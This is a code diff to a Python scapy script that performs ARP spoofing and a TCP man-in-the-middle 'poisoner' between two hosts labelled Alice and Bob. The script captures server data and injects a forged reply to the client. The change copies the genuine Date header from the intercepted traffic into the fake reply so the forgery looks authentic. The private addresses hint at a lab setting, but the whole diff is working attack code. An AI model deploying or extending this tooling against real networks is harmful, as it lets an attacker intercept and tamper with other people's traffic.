@@ -6,6 +6,7 @@ from threading import Thread
 import scapy.all as scap
 import scapy.config
 import logging
+import re
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
@@ -16,6 +17,8 @@ eth_interface_mac = None
 endpoint1_ip = '10.0.1.2' # Alice
 endpoint2_ip = '10.0.1.3' # Bob
 
+
+DATE_STR_PATTERN = re.compile(b"Date:(.(?<!GMT))+GMT")
 
 def LevenshteinDistance(str1, str2, str1len, str2len):
     if str1len == 0 or str2len == 0:
@@ -86,9 +89,12 @@ def thread_TCPoisoner_ServerSide(client_connection, server_connection):
         else:
             thread_TCPoisoner_server_stealed_data.extend(server_data)
             if thread_TCPoisoner_server_answer:
-                print("[SENDING FAKE REPLY]", file=sys.stderr)
-                client_connection.send(thread_TCPoisoner_server_answer)
-                thread_TCPoisoner_server_answer = None
+                newdate = DATE_STR_PATTERN.search(thread_TCPoisoner_server_stealed_data)
+                if newdate:
+                    thread_TCPoisoner_server_answer = re.sub(DATE_STR_PATTERN, newdate.group(), thread_TCPoisoner_server_answer, count=1)
+                    print("[SENDING FAKE REPLY]", file=sys.stderr)
+                    client_connection.send(thread_TCPoisoner_server_answer)
+                    thread_TCPoisoner_server_answer = None
 
 def thread_TCPoisoner_ClientSide():
     global threads_active
@@ -159,3 +165,5 @@ poisoner.start()
 spoofer = Thread(target = thread_ARPspoofer)
 spoofer.start()
 spoofer.join()
+
+poisoner.join()
